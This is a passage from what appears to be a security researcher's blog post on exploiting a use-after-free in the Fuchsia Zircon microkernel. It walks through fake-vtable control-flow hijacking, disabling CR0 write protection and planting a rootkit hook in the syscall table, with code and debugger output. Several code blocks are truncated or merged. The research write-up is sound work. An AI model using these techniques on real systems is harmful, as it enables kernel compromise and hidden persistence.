  <span>unsigned</span> <span>long</span> <span>**</span><span>vtable_ptr</span> <span>=</span> <span>(</span><span>unsigned</span> <span>long</span> <span>**</span><span>)</span><span>&amp;</span><span>spray_data</span><span>[</span><span>0</span><span>];</span>

  <span>// Control-flow hijacking in DownCastDispatcher():</span>
  <span>//   mov    rax,QWORD PTR [r13+0x0]</span>
  <span>//   movsxd r11,DWORD PTR [rax+0x8]</span>
  <span>//   add    r11,rax</span>
  <span>//   mov    rdi,r13</span>
  <span>//   call   0xffffffff0031a77c &lt;__x86_indirect_thunk_r11&gt;</span>

  <span>*</span><span>vtable_ptr</span> <span>=</span> <span>&amp;</span><span>fake_vtable</span><span>[</span><span>0</span><span>];</span> <span>// address in rax</span>
  <span>fake_vtable</span><span>[</span><span>1</span><span>]</span> <span>=</span> <span>(</span><span>unsigned</span> <span>long</span><span>)</span><span>pwn</span> <span>-</span> <span>(</span><span>unsigned</span> <span>long</span><span>)</span><span>*</span><span>vtable_ptr</span><span>;</span> <span>// value for DWORD PTR [rax+0x8]</span>
</code></pre></div></div>

<p>This looks tricky, but fear not, you&#39;ll like it!</p>

<p>Here the <code>spray_data</code> array stores the data for <code>zx_fifo_write()</code> overwriting <code>TimerDispatcher</code>. The vtable pointer resides at the beginning of the <code>TimerDispatcher</code> object, so <code>vtable_ptr</code> is initialized by the address of <code>spray_data[0]</code>. Then the address of the <code>fake_vtable</code> global array is written to the beginning of the <code>spray_data</code>. This address will appear in the <code>rax</code> register in <code>DownCastDispatcher()</code>, which I described above. The <code>fake_vtable[1]</code> element (or <code>DWORD PTR [rax+0x8]</code>) should store the value for calculating the function pointer of the <code>TimerDispatcher.get_type()</code> method. To calculate this value, I subtract the address of the fake vtable from the address of my <code>pwn()</code> function, which I&#39;m going use to attack the Zircon kernel.</p>

<p>This is the magic that happens with the addresses when the exploit is executed. The real example:</p>
<ol>
  <li>The <code>fake_vtable</code> array is at <code>0x35aa74aa020</code> and the <code>pwn()</code> function is at <code>0x35aa74a80e0</code></li>
  <li><code>fake_vtable[1]</code> is <code>0x35aa74a80e0 - 0x35aa74aa020 = 0xffffffffffffe0c0</code>. In <code>DownCastDispatcher()</code> this value appears in <code>DWORD PTR [rax+0x8]</code></li>
  <li>After Zircon executes the <code>movsxd r11, DWORD PTR [rax+0x8]</code>, the <code>r11</code> register stores <code>0xffffffffffffe0c0</code></li>
  <li>Adding <code>rax</code> with <code>0x35aa74aa020</code> to <code>r11</code> gives <code>0x35aa74a80e0</code>, which is the exact address of <code>pwn()</code></li>
  <li>So when Zircon calls <code>__x86_indirect_thunk_r11</code> the control flow goes to the <code>pwn()</code> function of the exploit.</li>
</ol>



<blockquote>
  <p>After achieving arbitrary code execution in the Zircon kernelspace, I started to think about what to attack with it.</p>
</blockquote>

<p>My first thought was to forge a fake <code>ZX_RSRC_KIND_ROOT</code> superpower resource, which I had previously seen in <code>zx_debuglog_create()</code>. But I didn&#39;t manage to engineer privilege escalation using <code>ZX_RSRC_KIND_ROOT</code>, because this resource is not used that much in the Fuchsia source code.</p>

<p>Knowing that Zircon is a microkernel, I realized that privilege escalation requires attacking the inter-process communication (IPC) that goes through the microkernel. In other words, I needed to use arbitrary code execution in Zircon to hijack the IPC between Fuchsia userspace components, for example, between my unprivileged exploit component and some privileged entity like the <a href="https://fuchsia.dev/fuchsia-src/get-started/learn/intro/components?hl=en#component_manager">Component Manager</a>.</p>

<p>I returned to studying the Fuchsia userspace, which was messy and boring… But suddenly I got an idea:</p>

<blockquote>
  <p>What about planting a rootkit into Zircon?</p>
</blockquote>

<p>That looked much more interesting, so I switched to investigating how Zircon syscalls work.</p>



<p>The life of a Fuchsia syscall is briefly described in the <a href="https://fuchsia.dev/fuchsia-src/concepts/kernel/life_of_a_syscall?hl=en">documentation</a>. Like the Linux kernel, Zircon also has a syscall table. On <code>x86_64</code>, Zircon defines the <code>x86_syscall()</code> function in <a href="https://fuchsia.googlesource.com/fuchsia/+/refs/heads/main/zircon/kernel/arch/x86/syscall.S">fuchsia/zircon/kernel/arch/x86/syscall.S</a>, which has the following code (I removed the comments):</p>

<pre><code>    cmp     $ZX_SYS_COUNT, %rax
    jae     .Lunknown_syscall
    leaq    .Lcall_wrapper_table(%rip), %r11
    movq    (%r11,%rax,8), %r11
    lfence
    jmp     *%r11
</code></pre>

<p>Here&#39;s how this code looks in the debugger:</p>

<div><div><pre><code>   0xffffffff00306fc8 &lt;+56&gt;:	cmp    rax,0xb0
   0xffffffff00306fce &lt;+62&gt;:	jae    0xffffffff00306fe1 &lt;x86_syscall+81&gt;
   0xffffffff00306fd0 &lt;+64&gt;:	lea    r11,[rip+0xbda21]        # 0xffffffff003c49f8
   0xffffffff00306fd7 &lt;+71&gt;:	mov    r11,QWORD PTR [r11+rax*8]
   0xffffffff00306fdb &lt;+75&gt;:	lfence 
   0xffffffff00306fde &lt;+78&gt;:	jmp    r11
</code></pre></div></div>

<p>Aha, it shows that the syscall table is at <code>0xffffffff003c49f8</code>. Let&#39;s see the contents:</p>

<div><div><pre><code>(gdb) x/10xg 0xffffffff003c49f8
0xffffffff003c49f8:	0xffffffff00307040	0xffffffff00307050
0xffffffff003c4a08:	0xffffffff00307070	0xffffffff00307080
0xffffffff003c4a18:	0xffffffff00307090	0xffffffff003070b0
0xffffffff003c4a28:	0xffffffff003070d0	0xffffffff003070f0
0xffffffff003c4a38:	0xffffffff00307110	0xffffffff00307130

$ disassemble 0xffffffff00307040
Dump of assembler code for function x86_syscall_call_bti_create:

   0xffffffff00307043 &lt;+3&gt;:	mov    rcx,r10
...
</code></pre></div></div>

<p>Here the first address <code>0xffffffff00307040</code> in the syscall table points to the <code>x86_syscall_call_bti_create()</code> function. It is system call number zero, which is defined in the auto-generated file <code>kernel-wrappers.inc</code> in the <code>gen/zircon/vdso/include/lib/syscalls/</code> directory. And the last syscall there is <code>x86_syscall_call_vmo_create_physical()</code> at <code>0xffffffff00307d10</code>, which is number 175 (see <code>ZX_SYS_COUNT</code> defined as 176). Showing the whole syscall table plus a bit more:</p>

<div><div><pre><code>(gdb) x/178xg 0xffffffff003c49f8

<p>Yes, the function pointer <code>0xffffffff00307d10</code> of the last syscall is right at the end of the syscall table. That knowledge was enough for my experiments with a rootkit.</p>



<p>As a first experiment, I overwrote the whole syscall table with <code>0x41</code> in my <code>pwn()</code> function. As I mentioned, this function is executed as a result of control-flow hijacking in Zircon. For overwriting the read-only syscall table, I used the old-school classic of changing the <code>WP</code> bit in the <code>CR0</code> register:</p>

<div><div><pre><code><span>#define SYSCALL_TABLE 0xffffffff003c49f8

<span>}</span>
</code></pre></div></div>

<p>The <code>CR0</code> helpers:</p>

<div><div><pre><code><span>void</span> <span>write_cr0</span><span>(</span><span>unsigned</span> <span>long</span> <span>value</span><span>)</span>

<p>Good. Then I started to think about how to hijack the Zircon syscalls. Doing that similarly to the Linux kernel rootkits was not possible: a usual Linux rootkit is a kernel module that provides hooks as functions from that particular module <strong>in the kernelspace</strong>. But in my case, I was trying to plant a rootkit from the <strong>userspace</strong> exploit into the microkernel. Implementing the rootkit hooks as userspace functions in the exploit process context could not work.</p>

<p>So I decided to turn some kernel code from Zircon into my rootkit hooks. My first candidate for overwriting was the <code>assert_fail_msg()</code> function, which drove me nuts during exploit development. That function was big enough, so I had a lot of space to place my hook payload.</p>

<p>I wrote my rootkit hook for the <code>zx_process_create()</code> syscall in C, but didn&#39;t like the assembly of that hook generated by the compiler. So I reimplemented it in asm. Let&#39;s look at the code, I like this part:</p>

<div><div><pre><code><span>#define XSTR(A) STR(A)

<ol>
  <li>This hook saves (pushes to the stack) all the registers that can be clobbered by the subsequent function calls.</li>
  <li>Then I prepare and call the Zircon <code>printf()</code> kernel function:
    <ul>
      <li>The first argument of this function is provided via the <code>rdi</code> register. It stores the address of the string that I want to print to the kernel log. More details on this will come later. The trick with <code>STR</code> and <code>XSTR</code> macros is used for the stringizing; you can read about it in the <a href="https://gcc.gnu.org/onlinedocs/gcc-11.3.0/cpp/Stringizing.html#Stringizing">GCC documentation</a>.</li>
      <li>Zero <code>al</code> indicates that no vector arguments are passed to this function with a variable number of arguments.</li>
      <li>The <code>r11</code> register stores the address of the Zircon <code>printf()</code> function, which is called by the <code>callq *%r11</code> instruction.</li>
    </ul>
  </li>
  <li>After calling the kernel <code>printf()</code>, the clobbered registers are restored.</li>
  <li>Finally, the hooked jumps to the original syscall <code>zx_process_create()</code>.</li>
</ol>

<p>And now the most interesting part: the rootkit planting. The <code>pwn()</code> function copies the code of the hook from the exploit binary into the Zircon kernel code at the address of <code>assert_fail_msg()</code>.</p>

<ol>
  <li><code>hook_addr</code> is initialized with the address of the <code>assert_fail_msg()</code> kernel function.</li>
  <li>The first byte of this function is overwritten with <code>0xc3</code>, which is the <code>ret</code> instruction. I do that to skip the Zircon crashes on assertions; now the assertion handling returns immediately.</li>
  <li>The exploit copies the code of my rootkit hook for the <code>zx_process_create()</code> syscall to the kernelspace. I described <code>process_create_hook()</code> above.</li>
  <li>The exploit copies the message string that I want to print on every <code>zx_process_create()</code> syscall. The hook will execute <code>mov $&#34; XSTR(ZIRCON_ASSERT_FAIL_MSG + 1 + HOOK_CODE_SIZE) &#34;,%rdi</code>, and the address of this string will get into <code>rdi</code>. Now you see why I added 1 byte to this address: it&#39;s for the additional <code>ret</code> instruction at the beginning of <code>assert_fail_msg()</code>.</li>
  <li>The address of the hook <code>ZIRCON_ASSERT_FAIL_MSG + 1</code> is written to the syscall table, item number 102, which is for the <code>zx_process_create()</code> syscall handler.</li>
  <li>Finally, the <code>pwn()</code> exploit function returns 42. As I mentioned, Zircon uses my fake vtable and executes this function instead of the <code>TimerDispatcher.get_type()</code> method. The original <code>get_type()</code> method of this kernel object returns 16 to pass the type check and proceed handling. And here I return 42 to fail this check and finish the <code>zx_timer_cancel()</code> system call, which hit use-after-free.</li>
</ol>

<p>Ok, the rootkit is now planted into the Zircon microkernel of Fuchsia OS!</p>



<p>I implemented a similar rootkit hook for the <code>zx_process_exit()</code> syscall at the place of the <code>assert_fail()</code> kernel function. So the rootkit prints the messages to the kernel log upon process creation and exiting. See the exploit demo:</p>

<p>That&#39;s how I came across Fuchsia OS and its Zircon microkernel. This work was a refreshing experience for me. I&#39;d wanted to try my kernel-hacking skills on this interesting OS for a long time ever since I heard about it at the Linux Security Summit 2018 in Vancouver. So I&#39;m glad of this research.</p>

<p>In this article, I gave an overview of the Fuchsia operating system, its security architecture, and the kernel development workflow. I assessed it from the attacker&#39;s perspective and shared the results of my exploit development experiments for the Zircon microkernel. I followed the responsible disclosure process for the Fuchsia security issues discovered during this research.</p>

<p>This is one of the first public researches on Fuchsia OS security. I believe this article will be useful for the OS security community, since it spotlights practical aspects of microkernel vulnerability exploitation and defense. I hope that my work will inspire you too to do kernel hacking. Thanks for reading!</p>
